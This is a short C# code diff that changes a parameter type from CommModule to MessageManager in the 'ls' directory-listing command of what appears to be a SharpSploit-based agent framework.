@@ -11,7 +11,7 @@ namespace Agent.Commands
     public class ListirectoryCommand : AgentCommand
     {
         public override string Name => "ls";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             var results = new SharpSploitResultList<ListDirectoryResult>();
 
